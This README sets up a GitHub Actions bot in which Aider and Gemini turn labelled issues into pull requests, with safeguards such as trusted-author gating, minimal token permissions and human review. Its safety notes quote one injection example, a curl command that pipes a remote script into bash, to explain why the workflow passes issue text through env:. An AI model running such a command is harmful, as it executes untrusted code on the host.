# AI Issue-to-PR bot (Aider + Gemini)

Label an issue, and a bot writes the code and opens a pull request against it,
using [Aider](https://aider.chat) driven by Google's Gemini API.

## How it works

```
issue opened/labeled "ai-task"
        │
        ▼
GitHub Actions workflow (.github/workflows/ai-issue-to-pr.yml)
        │
        ▼
scripts/ai_issue_handler.sh
   1. prepare -> create branch ai/issue-<N>, write prompt from issue text
   2. run     -> aider --model gemini/... --message-file prompt.md
   3. finish  -> push branch, open PR "Closes #<N>", comment on the issue
```

## One-time setup

1. **Add the Gemini API key as a repo secret.**
   Get a key from [Google AI Studio](https://aistudio.google.com/app/apikey), then in your repo:
   `Settings → Secrets and variables → Actions → New repository secret`
   Name it exactly `GEMINI_API_KEY`.

2. **Create a label called `ai-task`.**
   `Settings → Labels → New label` (any color). This is the opt-in switch —
   the workflow only runs on issues carrying this label. Nothing else in
   your repo needs to change; issues without the label are ignored.

3. *(Optional)* Create a label called `ai-generated`. If it exists, opened
   PRs are tagged with it automatically so it's obvious at a glance which
   PRs came from the bot. If you skip this, the workflow still works —
   it just skips the label.

4. *(Optional)* Set a repository **variable** named `AIDER_MODEL` if you
   want to override the default model (`gemini/gemini-2.5-pro`). For
   example, if your Aider version supports Gemini 3:
   `AIDER_MODEL = gemini/gemini-3-pro-preview`.
   Check `aider --model gemini/gemini-3-pro-preview` support for the pinned
   Aider version before relying on this — model availability changes often.

5. Drop these two files into your repo, preserving the paths:
   - `.github/workflows/ai-issue-to-pr.yml`
   - `scripts/ai_issue_handler.sh` (make sure it's committed with execute
     permission, or the workflow's `bash scripts/...` invocation, which
     doesn't require the execute bit, still works fine either way)

That's it — no other install step. The workflow installs Aider itself on
each run via `pip install aider-chat`.

## Using it

1. Open a GitHub issue describing the change you want, as clearly and
   specifically as you can — Aider only knows what's in the issue title
   and body. Good issue text reads like a task you'd hand a junior dev:
   *what* to build/fix, *where* (if you know), and any constraints.
2. Add the `ai-task` label (or include it when you file the issue, if your
   issue form supports pre-set labels).
3. Within a minute or two the bot will either:
   - open a pull request titled `Fix #N: <issue title>` that closes the
     issue on merge, with a summary comment on the issue linking to it, or
   - comment on the issue explaining that it couldn't produce a safe change
     (e.g. the request was too vague, or Aider/Gemini errored out) — the
     log tail is included in that comment so you can see why.
4. **Review the PR like any other contributor's PR before merging.** This
   bot writes code with no human in the loop at write-time; treat it the
   same as an untrusted external contribution — read the diff, run your
   CI, and merge only if it looks right.
5. If the first attempt isn't right, you can either fix it up yourself in
   review comments/commits on that PR, or remove and re-add the `ai-task`
   label to have the bot take another pass (it will overwrite the branch
   with a fresh attempt from the issue text as currently written, so edit
   the issue body first if you want the retry to use different guidance).

## Safety notes (read before enabling on a public repo)

- **Trigger is gated to trusted authors.** The workflow only runs if the
  issue author's `author_association` is `OWNER`, `MEMBER`, or
  `COLLABORATOR`. On a public repo, a random stranger filing an issue and
  adding the label (if they even have permission to add labels, which
  external contributors usually don't) will *not* trigger a run. Tighten
  or loosen this list in the workflow's `if:` condition to match your repo.
- **Issue text is treated as untrusted input.** The issue title/body is
  passed into the job via `env:`, not interpolated directly into a `run:`
  script with `${{ }}`. This matters: GitHub Actions substitutes `${{ }}`
  expressions into the script text *before* bash runs it, so putting
  attacker-controlled text there directly is a known injection vector
  (someone could put `` `curl evil.sh | bash` `` in an issue title). Piping
  it through `env:` avoids that — please don't "simplify" this back to
  inline interpolation.
- **Token permissions are minimized** to `contents: write`,
  `pull-requests: write`, `issues: write` — nothing else — via the
  `permissions:` block, rather than relying on a broader default.
- **The bot never merges anything.** It only opens/updates a PR. Branch
  protection rules on your default branch still apply normally.
- **Cost control:** `concurrency` cancels a stale run if the label is
  toggled again quickly, and the job has a 25-minute `timeout-minutes` so
  a stuck Aider session can't run indefinitely and burn API quota.
- **Gemini API costs money** past any free tier — each run is a real API
  call against your key. Keep an eye on usage in Google AI Studio /
  Google Cloud console if you open this up to a busy issue tracker.

## Tuning Aider's behavior

Everything Aider does is driven by `scripts/ai_issue_handler.sh` and the
prompt template built in its `stage_prepare` function. Common tweaks:

- **Give it test/lint commands** so it self-checks before committing: add
  a `.aider.conf.yml` at your repo root with `test-cmd: <your test command>`
  and `auto-test: true` — Aider will run tests after edits and try to fix
  failures itself. See https://aider.chat/docs/config/aider_conf.html.
- **Restrict scope** (e.g. only ever touch a `src/` directory) by adding a
  line to the prompt in `stage_prepare`, or by passing explicit file paths
  to the `aider` command in `stage_run` instead of letting it use the full
  repo map.
- **Change the branch/PR naming scheme** in `stage_prepare` /
  `stage_finish` if `ai/issue-<N>` and `Fix #N: <title>` don't match your
  conventions.
